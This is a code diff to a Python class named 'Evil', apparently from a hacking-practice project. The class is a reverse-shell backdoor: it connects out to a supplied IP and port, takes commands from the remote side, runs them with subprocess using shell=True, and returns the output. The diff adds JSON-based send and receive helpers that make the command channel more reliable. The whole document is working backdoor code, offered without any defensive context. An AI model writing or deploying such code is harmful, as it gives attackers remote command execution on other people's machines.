@@ -6,7 +6,7 @@
 
 import socket
 import subprocess
-
+import json
 
 class Evil:
     def __init__(self,ip,port):
@@ -14,20 +14,33 @@ class Evil:
         self.connection.connect((ip, port))
         self.connection.send("\n[+] connection established.\n")
 
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_recv(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
     def exec_sys_cmd(self,cmd):
         return subprocess.check_output(cmd,shell=True)
 
     def run(self):
         while True:
             try:
-                cmd = self.connection.recv(1024)
+                cmd = self.reliable_recv()
                 cmd_result = self.exec_sys_cmd(cmd)
                 if not cmd_result:
-                    self.connection.send("System command exception")
+                    self.reliable_send("System command exception")
                     continue
-                self.connection.send(cmd_result)
+                self.reliable_send(cmd_result)
             except Exception:
-                self.connection.send("Something wrong...")
+                self.reliable_send("Something wrong...")
                 continue
 
         self.connection.close()
